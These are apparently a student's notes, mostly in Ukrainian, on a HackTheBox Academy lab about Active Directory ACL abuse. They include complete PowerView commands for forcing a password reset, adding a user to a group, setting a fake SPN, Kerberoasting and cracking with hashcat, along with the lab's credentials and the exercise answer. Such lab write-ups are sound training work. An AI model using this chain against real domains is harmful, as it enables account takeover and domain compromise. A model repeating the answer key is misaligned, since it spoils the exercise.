```markdown
# ACL Abuse Tactics

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1486](https://academy.hackthebox.com/app/module/143/section/1486) |

***

## 🔑 Теорія — Ланцюг ACL атак

Маючи контроль над юзером `wley`, виконуємо ланцюг атак:

```
wley → (ForceChangePassword) → damundsen
damundsen → (GenericWrite) → Help Desk Level 1 group
Help Desk Level 1 → (вкладена в) → Information Technology group
Information Technology → (GenericAll) → adunn
adunn → (DCSync rights) → Domain Compromise
```

***

## 🔑 Ключові команди

### Крок 1 — Підключення по RDP
```bash
xfreerdp /u:htb-student /p:'Academy_student_AD!' /v:<TARGET_IP>
```

### Крок 2 — Імпорт PowerView
```powershell
Import-Module C:\Tools\PowerView.ps1
```

### Крок 3 — Автентифікація як wley та скидання пароля damundsen
```powershell
# Створюємо PSCredential об'єкт для wley
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Скидаємо пароль damundsen через ForceChangePassword
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred
```

### Крок 4 — Додаємо damundsen до Help Desk Level 1 через GenericWrite
```powershell
# Автентифікація як damundsen
$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)

# Додаємо damundsen до групи Help Desk Level 1
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2

# Перевіряємо що додали
Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName
```

### Крок 5 — Встановлюємо фейковий SPN на adunn через GenericAll
```powershell
# Через членство в Help Desk Level 1 → Information Technology → GenericAll над adunn
$Cred3 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)

# Встановлюємо фейковий SPN — тепер adunn можна Kerberoast-ити
Set-DomainObject -Credential $Cred3 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'}

# Перевіряємо
Get-DomainUser -Identity adunn | Select serviceprincipalname
```

### Крок 6 — Kerberoast adunn та отримати hash
```powershell
# Отримуємо TGS тікет для adunn
Get-DomainUser -Identity adunn | Get-DomainSPNTicket | fl
# Копіюємо hash ($krb5tgs$23$*...) для офлайн крекінгу
```

### Крок 7 — Зламати hash через hashcat (Windows)
```powershell
# Зберегти hash у файл
Set-Content -Path "C:\hashcat_share\adunn.hash" -Value '$krb5tgs$23$*adunn$...'

# Запустити hashcat з GPU
cd C:\hashcat_share\hashcat-7.1.2
.\hashcat.exe -m 13100 C:\hashcat_share\adunn.hash C:\hashcat_share\rockyou.txt -O
```

### ⚠️ Крок 8 — CLEANUP (обов'язково після пентесту!)
```powershell
# Видалити фейковий SPN з adunn
Set-DomainObject -Credential $Cred3 -Identity adunn -Clear serviceprincipalname

# Видалити damundsen з групи Help Desk Level 1
Remove-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2

# Перевірити що прибрали
Get-DomainUser -Identity adunn | Select serviceprincipalname
Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName
```

***

## 🧪 Практика

### Середовище

| Параметр | Значення |
|----------|----------|
| Attack Host | `10.129.x.x` (ACADEMY-EA-MS01) |
| RDP | `htb-student` / `Academy_student_AD!` |
| DC | `172.16.5.5` (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL) |
| wley password | `transporter@4` |

### Q1 — Set a fake SPN for adunn, Kerberoast and crack the hash. Submit the cleartext password.

```powershell
# Крок 1 — Підключитись по RDP
# xfreerdp /u:htb-student /p:'Academy_student_AD!' /v:10.129.x.x

# Крок 2 — Імпортувати PowerView
Import-Module C:\Tools\PowerView.ps1

# Крок 3 — Скинути пароль damundsen через wley
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred

# Крок 4 — Додати damundsen до Help Desk Level 1
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2

# Крок 5 — Встановити фейковий SPN на adunn
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'}

# Крок 6 — Kerberoast adunn і отримати hash
Get-DomainUser -Identity adunn | Get-DomainSPNTicket | fl
# Копіюємо hash і зберігаємо у файл

# Крок 7 — Зламати через hashcat на Windows
Set-Content -Path "C:\hashcat_share\adunn.hash" -Value '$krb5tgs$23$*adunn$...'
cd C:\hashcat_share\hashcat-7.1.2
.\hashcat.exe -m 13100 C:\hashcat_share\adunn.hash C:\hashcat_share\rockyou.txt -O
```

```
$krb5tgs$23$*adunn$...:SyncMaster757
Status: Cracked
```

> ⚠️ Після отримання відповіді — обов'язково виконай Cleanup (Крок 8)!

✅ **Відповідь: `SyncMaster757`**
```
